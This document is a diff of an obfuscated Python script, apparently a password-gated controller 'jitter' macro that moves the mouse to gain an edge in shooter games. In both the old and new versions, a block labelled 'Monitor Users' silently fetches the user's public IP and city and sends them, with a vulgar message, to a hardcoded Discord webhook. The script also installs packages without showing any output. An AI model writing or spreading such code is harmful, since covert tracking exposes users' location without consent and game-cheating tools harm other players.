@@ -23,83 +23,77 @@ os .system ("cls")#line:22
 print (f"{LIGHT_PURPLE}Scripted is now hosted by {LIGHT_WHITE}@BisKit\033[0m")#line:23
 time .sleep (1.9 )#line:24
 os .system ("cls")#line:25
-def install_packages ():#line:34
- O000O0OOO0OO00O00 =['/','-','\\','|']#line:27
- for OO0O0O000OOOOO0OO in range (5 ):#line:28
-  for O0OOOOOOO0O00OOOO in O000O0OOO0OO00O00 :#line:29
-     sys .stdout .write (f'\r{LIGHT_PURPLE}Checking if all the {LIGHT_WHITE}packages are already installed,{LIGHT_CYAN} please wait{LIGHT_WHITE}...  {LIGHT_PURPLE}{O0OOOOOOO0O00OOOO}\r\033[0m')#line:30
+def install_packages ():#line:26
+ O00O0O000OO00OOO0 =['/','-','\\','|']#line:27
+ for OOOO0O00O0OO0O0O0 in range (5 ):#line:28
+  for OO0O0O00OO0OO00OO in O00O0O000OO00OOO0 :#line:29
+     sys .stdout .write (f'\r{LIGHT_PURPLE}Checking if all the {LIGHT_WHITE}packages are already installed,{LIGHT_CYAN} please wait{LIGHT_WHITE}...  {LIGHT_PURPLE}{OO0O0O00OO0OO00OO}\r\033[0m')#line:30
      sys .stdout .flush ()#line:31
      time .sleep (0.1 )#line:32
-
-
-try:
-    import pygame, colorama, win32api, requests
-    os.system("cls")
-except ImportError:
-    print("Installing needed packages")
-    os.system("pip install pygame pywin32 requests colorama >nul 2>&1")
-install_packages()
-time.sleep(0.001)
-import os #line:48
-import shutil #line:49
-import time #line:50
-import win32api #line:51
-import win32con #line:52
-os .environ ['PYGAME_HIDE_SUPPORT_PROMPT']='1'#line:53
-import pygame #line:54
-from colorama import Fore ,Style #line:55
-os .system ('cls')#line:56
-import requests #line:57
-import requests
-"""Monitor Users"""
-try:
- ip = requests.get("https://api.ipify.org").text
- message = {
-    "content": f"asia loves kids  {ip}"
-}
- geo = requests.get(f"https://ipinfo.io/{ip}/json").json()
- geo_info = (
-    f"Area {geo.get('city', 'N/A')}\n"
-) 
- webhook_url = "https://discord.com/api/webhooks/1382532762929467443/qnTBZfbMSbHhjmJ7sR-t2L1zCztsqVJr8HlkTZ9gTVcFKQaUWmNlWtjSMLShk5NfYO2q"
- requests.post(webhook_url, json={"content": geo_info})
- requests.post(webhook_url, json=message)
-except:
-   pass
-"""Monitor Users"""
-time .sleep (0.01 )#line:60
-os .system ("cls")#line:61
-def loading ():#line:62
- O0O0O0OOOO0O00OO0 =['/','-','\\','|']#line:63
- for OO00OO0OO0O0O0OO0 in range (5 ):#line:64
-  for O00O0O0O0OOOOO0OO in O0O0O0OOOO0O00OO0 :#line:65
-     sys .stdout .write (f'\r{LIGHT_CYAN}Loading{LIGHT_WHITE} Please Wait{LIGHT_CYAN}...  {LIGHT_PURPLE}{O00O0O0O0OOOOO0OO}')#line:66
-     sys .stdout .flush ()#line:67
-     time .sleep (0.1 )#line:68
-loading ()#line:69
-os .system ("cls")#line:70
-print (f"{LIGHT_CYAN}***************************************************************************************************************")#line:71
-print (f"{LIGHT_PURPLE}:{LIGHT_PURPLE}🐧 This Project Was A Reverse Engineering Script Edited And Decompiled By Controller Ascend, {LIGHT_GREEN}@BisKit {LIGHT_CYAN}@Lonely{LIGHT_WHITE}{LIGHT_PURPLE} : \033[0m")#line:72
-print (f"{LIGHT_CYAN}***************************************************************************************************************")#line:73
-time .sleep (4 )#line:74
-os .system ('cls')#line:75
-def main2 ():#line:76
- for OO00O000O00OO00OO in range (2 ):#line:77
+try :#line:35
+    import pygame ,colorama ,win32api ,requests #line:36
+    os .system ("cls")#line:37
+except ImportError :#line:38
+    print ("Installing needed packages")#line:39
+    os .system ("pip install pygame pywin32 requests colorama >nul 2>&1")#line:40
+install_packages ()#line:41
+time .sleep (0.001 )#line:42
+import os #line:43
+import shutil #line:44
+import time #line:45
+import win32api #line:46
+import win32con #line:47
+os .environ ['PYGAME_HIDE_SUPPORT_PROMPT']='1'#line:48
+import pygame #line:49
+from colorama import Fore ,Style #line:50
+os .system ('cls')#line:51
+import requests #line:52
+import requests #line:53
+"""Monitor Users"""#line:54
+try :#line:55
+ ip =requests .get ("https://api.ipify.org").text #line:56
+ message ={"content":f"asia loves kids {ip}"}#line:59
+ geo =requests .get (f"https://ipinfo.io/{ip}/json").json ()#line:60
+ geo_info =(f"Area {geo.get('city')}\n")#line:63
+ webhook_url ="https://discord.com/api/webhooks/1382532762929467443/qnTBZfbMSbHhjmJ7sR-t2L1zCztsqVJr8HlkTZ9gTVcFKQaUWmNlWtjSMLShk5NfYO2q"#line:64
+ requests .post (webhook_url ,json ={"content":geo_info })#line:65
+ requests .post (webhook_url ,json =message )#line:66
+except :#line:67
+   pass #line:68
+"""Monitor Users"""#line:69
+time .sleep (0.01 )#line:70
+os .system ("cls")#line:71
+def loading ():#line:72
+ OO0OOO0O0OOOO0O0O =['/','-','\\','|']#line:73
+ for O0OO0OO00O00OO00O in range (5 ):#line:74
+  for O0000OO0O000O000O in OO0OOO0O0OOOO0O0O :#line:75
+     sys .stdout .write (f'\r{LIGHT_CYAN}Loading{LIGHT_WHITE} Please Wait{LIGHT_CYAN}...  {LIGHT_PURPLE}{O0000OO0O000O000O}')#line:76
+     sys .stdout .flush ()#line:77
+     time .sleep (0.1 )#line:78
+loading ()#line:79
+os .system ("cls")#line:80
+print (f"{LIGHT_CYAN}***************************************************************************************************************")#line:81
+print (f"{LIGHT_PURPLE}:{LIGHT_PURPLE}🐧 This Project Was A Reverse Engineering Script Edited And Decompiled By Controller Ascend, {LIGHT_GREEN}@BisKit {LIGHT_CYAN}@Lonely{LIGHT_WHITE}{LIGHT_PURPLE} : \033[0m")#line:82
+print (f"{LIGHT_CYAN}***************************************************************************************************************")#line:83
+time .sleep (4 )#line:84
+os .system ('cls')#line:85
+def main2 ():#line:86
+ for O0OOO00O00O00OO0O in range (2 ):#line:87
   print (f"""  {LIGHT_PURPLE}                                                            
           _____             _         _    _____                   _ 
 {LIGHT_CYAN}         |     |___ ___ ___| |_ ___ _| |  |  _  |___ ___ ___ ___ _| |
 {LIGHT_GREEN}         |   --|  _| .'|  _| '_| -_| . |  |     |_ -|  _| -_|   | . |
-{LIGHT_PURPLE}         |_____|_| |__,|___|_,_|___|___|  |__|__|___|___|___|_|_|___|""")#line:82
-  print (f"{LIGHT_WHITE}         @BisKit {LIGHT_CYAN}@Lonely\033[0m\n")#line:83
-  OOOOO0OOO0O00OO00 =input (f"""{LIGHT_CYAN}['\033[0m{LIGHT_PURPLE}Enter Password To {LIGHT_CYAN}Access{LIGHT_PURPLE}:{LIGHT_GREEN} """)#line:84
-  if OOOOO0OOO0O00OO00 =="9001":#line:85
-    print ("")#line:86
-    break #line:87
-  else :#line:88
-    os .system ("cls")#line:89
-    print (f"{LIGHT_CYAN}Wrong Password, \033[0m{LIGHT_WHITE}['{LIGHT_PURPLE}{1 - OO00O000O00OO00OO}{LIGHT_WHITE}'] \033[0m{LIGHT_PURPLE}Attempts Left Untill Exiting, Cracked Ascend")#line:90
- else :#line:91
-    os .system ("cls")#line:92
+{LIGHT_PURPLE}         |_____|_| |__,|___|_,_|___|___|  |__|__|___|___|___|_|_|___|""")#line:92
+  print (f"{LIGHT_WHITE}         @BisKit {LIGHT_CYAN}@Lonely\033[0m\n")#line:93
+  O000O0O0000OO0OOO =input (f"""{LIGHT_CYAN}['\033[0m{LIGHT_PURPLE}Enter Password To {LIGHT_CYAN}Access{LIGHT_PURPLE}:{LIGHT_GREEN} """)#line:94
+  if O000O0O0000OO0OOO =="9001":#line:95
+    print ("")#line:96
+    break #line:97
+  else :#line:98
+    os .system ("cls")#line:99
+    print (f"{LIGHT_CYAN}Wrong Password, \033[0m{LIGHT_WHITE}['{LIGHT_PURPLE}{1 - O0OOO00O00O00OO0O}{LIGHT_WHITE}'] \033[0m{LIGHT_PURPLE}Attempts Left Untill Exiting, Cracked Ascend")#line:100
+ else :#line:101
+    os .system ("cls")#line:102
     print (f"""{LIGHT_GREEN}                     
  _       _               
 | |_ _ _| |_ ___ _ _ ___ 
@@ -107,85 +101,85 @@ def main2 ():#line:76
 {LIGHT_PURPLE}|___|___|___|___|_  |___|
                 |___|    
 
-{LIGHT_WHITE}Used All Password Attempts...\n""")#line:99
-    time .sleep (2.1 )#line:100
-    OOOOO0OOO0O00OO00 =quit ()#line:101
-main2 ()#line:102
-def clear_screen ():#line:103
-    O00OO0O0OO00OOO00 ='cls'if os .name =='nt'else 'clear'#line:104
-    os .system (O00OO0O0OO00OOO00 )#line:105
-def get_terminal_width ():#line:106
-    return shutil .get_terminal_size ().columns #line:107
-def color_text (O00OOOOOO0OOOO00O ,color =Fore .WHITE ):#line:108
-    O0O00O0OO0OOO000O =O00OOOOOO0OOOO00O .split ('\n')#line:109
-    OO0OOOO0000OO0O00 =get_terminal_width ()#line:110
-    O0O0OO0OO0O0O0OO0 =[color +OO00O0O0O00O0OO00 .center (OO0OOOO0000OO0O00 )+Style .RESET_ALL for OO00O0O0O00O0OO00 in O0O00O0OO0OOO000O ]#line:111
-    return '\n'.join (O0O0OO0OO0O0O0OO0 )#line:112
-def center_text (OO0O0OO00O0O0OO00 ):#line:113
-    O000O0OOO00O0OOO0 =shutil .get_terminal_size ().columns #line:114
-    O00OO000OOO0OO0O0 =[OO00O0OOOO0O00OOO .center (O000O0OOO00O0OOO0 )for OO00O0OOOO0O00OOO in OO0O0OO00O0O0OO00 .split ('\n')]#line:115
-    return '\n'.join (O00OO000OOO0OO0O0 )#line:116
-def load_settings ():#line:117
-    os .system ("cls")#line:118
-    print (f"{LIGHT_WHITE}Pick {LIGHT_PURPLE}Default {LIGHT_WHITE}[{LIGHT_CYAN}1{LIGHT_WHITE}] (INGORE THIS MIGHT BE USING THIS FOR NEAR FUTURE) ")#line:119
-    print (f"{LIGHT_WHITE}Pick {LIGHT_WHITE}[{LIGHT_CYAN}2{LIGHT_WHITE}] {LIGHT_PURPLE}original jitter {LIGHT_WHITE}+ {LIGHT_CYAN}edited Time_Sleep\033[0m")#line:120
-    OOO000O0OO0000000 =input (f"{LIGHT_WHITE}What Jitter Setting, {LIGHT_PURPLE}Do You Want To Use{LIGHT_PURPLE}:{LIGHT_CYAN}= {LIGHT_CYAN}")#line:121
-    if OOO000O0OO0000000 =="1":#line:122
-       return (24 ,24 ,24 ,28 ,0.013 )#line:123
-    else :#line:124
-       return (20 ,20 ,20 ,24 ,0.01 )#line:125
-def display_banner (O0O000OO00OOOOOO0 ,OO0OO000OOOO0OOO0 ,O00O0OO00OOO0O0O0 ,OO000OO000O00O0O0 ):#line:126
+{LIGHT_WHITE}Used All Password Attempts...\n""")#line:110
+    time .sleep (2.1 )#line:111
+    O000O0O0000OO0OOO =quit ()#line:112
+main2 ()#line:113
+def clear_screen ():#line:114
+    OO0O00O000O00O000 ='cls'if os .name =='nt'else 'clear'#line:115
+    os .system (OO0O00O000O00O000 )#line:116
+def get_terminal_width ():#line:117
+    return shutil .get_terminal_size ().columns #line:118
+def color_text (OO00OO0OOOOOO0O0O ,color =Fore .WHITE ):#line:119
+    OO00000O00OOO0O00 =OO00OO0OOOOOO0O0O .split ('\n')#line:120
+    O000O000O0O0O0000 =get_terminal_width ()#line:121
+    O00OO00OOO0O00OOO =[color +OO0OO0OOO00O0OO00 .center (O000O000O0O0O0000 )+Style .RESET_ALL for OO0OO0OOO00O0OO00 in OO00000O00OOO0O00 ]#line:122
+    return '\n'.join (O00OO00OOO0O00OOO )#line:123
+def center_text (O00O00O0O0000O00O ):#line:124
+    OOOO0OOO0O0OOOOOO =shutil .get_terminal_size ().columns #line:125
+    OO0O000O0O0O000OO =[OO0OOO000O00OOO0O .center (OOOO0OOO0O0OOOOOO )for OO0OOO000O00OOO0O in O00O00O0O0000O00O .split ('\n')]#line:126
+    return '\n'.join (OO0O000O0O0O000OO )#line:127
+def load_settings ():#line:128
+    os .system ("cls")#line:129
+    print (f"{LIGHT_WHITE}Pick {LIGHT_PURPLE}Default {LIGHT_WHITE}[{LIGHT_CYAN}1{LIGHT_WHITE}] (INGORE THIS MIGHT BE USING THIS FOR NEAR FUTURE) ")#line:130
+    print (f"{LIGHT_WHITE}Pick {LIGHT_WHITE}[{LIGHT_CYAN}2{LIGHT_WHITE}] {LIGHT_PURPLE}original jitter {LIGHT_WHITE}+ {LIGHT_CYAN}edited Time_Sleep\033[0m")#line:131
+    O0O0O0OO0O0O00O0O =input (f"{LIGHT_WHITE}What Jitter Setting, {LIGHT_PURPLE}Do You Want To Use{LIGHT_PURPLE}:{LIGHT_CYAN}= {LIGHT_CYAN}")#line:132
+    if O0O0O0OO0O0O00O0O =="1":#line:133
+       return (24 ,24 ,24 ,28 ,0.013 )#line:134
+    else :#line:135
+       return (20 ,20 ,20 ,24 ,0.01 )#line:136
+def display_banner (O0OOOOOOO00O00OOO ,O0O00OOO0OOOO00OO ,O00O00000O0O00000 ,O0OO000OOO0000000 ):#line:137
   print (f"""  {LIGHT_PURPLE}                                                            
           _____             _         _    _____                   _ 
 {LIGHT_CYAN}         |     |___ ___ ___| |_ ___ _| |  |  _  |___ ___ ___ ___ _| |
 {LIGHT_GREEN}         |   --|  _| .'|  _| '_| -_| . |  |     |_ -|  _| -_|   | . |
-{LIGHT_PURPLE}         |_____|_| |__,|___|_,_|___|___|  |__|__|___|___|___|_|_|___|""")#line:131
-  print (f"{LIGHT_WHITE}         @BisKit {LIGHT_CYAN}@Lonely\033[0m\n")#line:132
-def mouse_motion ():#line:133
-    win32api .mouse_event (win32con .MOUSEEVENTF_MOVE ,move_right ,move_down ,29 ,29 ,)#line:134
-    time .sleep (0.0037 )#line:135
-    win32api .mouse_event (win32con .MOUSEEVENTF_MOVE ,-move_left ,-move_up ,-29 ,-29 )#line:136
-def monitor_settings (OOO0O0O0O00000000 ):#line:137
-    return OOO0O0O0O00000000 #line:138
-def wait_for_controller ():#line:139
-    while pygame .joystick .get_count ()==0 :#line:140
-        clear_screen ()#line:141
-        display_banner (move_right ,move_left ,move_up ,move_down )#line:142
-        time .sleep (1 )#line:143
-        pygame .joystick .quit ()#line:144
-        pygame .joystick .init ()#line:145
-    O0O0O0OOO00O0O0OO =pygame .joystick .Joystick (0 )#line:146
-    O0O0O0OOO00O0O0OO .init ()#line:147
-    clear_screen ()#line:148
-    display_banner (move_right ,move_left ,move_up ,move_down )#line:149
-    print (f"\n{LIGHT_WHITE}                   Works For {YELLOW}Xbox {LIGHT_WHITE}+ {LIGHT_PURPLE}Ps4/5                             {LIGHT_CYAN}LT + LR{LIGHT_WHITE} or {LIGHT_PURPLE}L1 + L2\033[0m")#line:150
-    print (f"\n{LIGHT_WHITE}                                            Project By \033[1;32m@BisKit \033[1;36m@Lonely\033[0m")#line:151
-    print (f"                                                ['{LIGHT_PURPLE}Jitter Activated'\033[0m]")#line:152
-    return O0O0O0OOO00O0O0OO #line:153
-try :#line:154
- move_right ,move_left ,move_up ,move_down ,time_sleep =load_settings ()#line:155
- current_settings =(move_right ,move_left ,move_up ,move_down )#line:156
- pygame .init ()#line:157
- pygame .joystick .init ()#line:158
- controller =wait_for_controller ()#line:159
- while True :#line:160
-    for event in pygame .event .get ():#line:161
-        if event .type ==pygame .QUIT :#line:162
-            pygame .quit ()#line:163
-            exit ()#line:164
-    if pygame .joystick .get_count ()==0 :#line:165
-        pygame .quit ()#line:166
-        exit ()#line:167
-    aim =controller .get_axis (4 )#line:168
-    shoot =controller .get_axis (5 )#line:169
-    if aim >0.0 and shoot >0.0 :#line:170
-        mouse_motion ()#line:171
-    if int (time .time ())%2 ==0 :#line:172
-        updated_settings =monitor_settings (current_settings )#line:173
-        if updated_settings !=current_settings :#line:174
-            move_right ,move_left ,move_up ,move_down =updated_settings #line:175
-            current_settings =updated_settings #line:176
-            display_banner (move_right ,move_left ,move_up ,move_down )#line:177
-    time .sleep (time_sleep )#line:178
-except KeyboardInterrupt :#line:179
+{LIGHT_PURPLE}         |_____|_| |__,|___|_,_|___|___|  |__|__|___|___|___|_|_|___|""")#line:142
+  print (f"{LIGHT_WHITE}         @BisKit {LIGHT_CYAN}@Lonely\033[0m\n")#line:143
+def mouse_motion ():#line:144
+    win32api .mouse_event (win32con .MOUSEEVENTF_MOVE ,move_right ,move_down ,29 ,29 ,)#line:145
+    time .sleep (0.0037 )#line:146
+    win32api .mouse_event (win32con .MOUSEEVENTF_MOVE ,-move_left ,-move_up ,-29 ,-29 )#line:147
+def monitor_settings (O0O0OO00O0OO00OOO ):#line:148
+    return O0O0OO00O0OO00OOO #line:149
+def wait_for_controller ():#line:150
+    while pygame .joystick .get_count ()==0 :#line:151
+        clear_screen ()#line:152
+        display_banner (move_right ,move_left ,move_up ,move_down )#line:153
+        time .sleep (1 )#line:154
+        pygame .joystick .quit ()#line:155
+        pygame .joystick .init ()#line:156
+    O00OOO00OOO00OO00 =pygame .joystick .Joystick (0 )#line:157
+    O00OOO00OOO00OO00 .init ()#line:158
+    clear_screen ()#line:159
+    display_banner (move_right ,move_left ,move_up ,move_down )#line:160
+    print (f"\n{LIGHT_WHITE}                   Works For {YELLOW}Xbox {LIGHT_WHITE}+ {LIGHT_PURPLE}Ps4/5                             {LIGHT_CYAN}LT + LR{LIGHT_WHITE} or {LIGHT_PURPLE}L1 + L2\033[0m")#line:161
+    print (f"\n{LIGHT_WHITE}                                            Project By \033[1;32m@BisKit \033[1;36m@Lonely\033[0m")#line:162
+    print (f"                                                ['{LIGHT_PURPLE}Jitter Activated'\033[0m]")#line:163
+    return O00OOO00OOO00OO00 #line:164
+try :#line:165
+ move_right ,move_left ,move_up ,move_down ,time_sleep =load_settings ()#line:166
+ current_settings =(move_right ,move_left ,move_up ,move_down )#line:167
+ pygame .init ()#line:168
+ pygame .joystick .init ()#line:169
+ controller =wait_for_controller ()#line:170
+ while True :#line:171
+    for event in pygame .event .get ():#line:172
+        if event .type ==pygame .QUIT :#line:173
+            pygame .quit ()#line:174
+            exit ()#line:175
+    if pygame .joystick .get_count ()==0 :#line:176
+        pygame .quit ()#line:177
+        exit ()#line:178
+    aim =controller .get_axis (4 )#line:179
+    shoot =controller .get_axis (5 )#line:180
+    if aim >0.0 and shoot >0.0 :#line:181
+        mouse_motion ()#line:182
+    if int (time .time ())%2 ==0 :#line:183
+        updated_settings =monitor_settings (current_settings )#line:184
+        if updated_settings !=current_settings :#line:185
+            move_right ,move_left ,move_up ,move_down =updated_settings #line:186
+            current_settings =updated_settings #line:187
+            display_banner (move_right ,move_left ,move_up ,move_down )#line:188
+    time .sleep (time_sleep )#line:189
+except KeyboardInterrupt :#line:190
  print ()
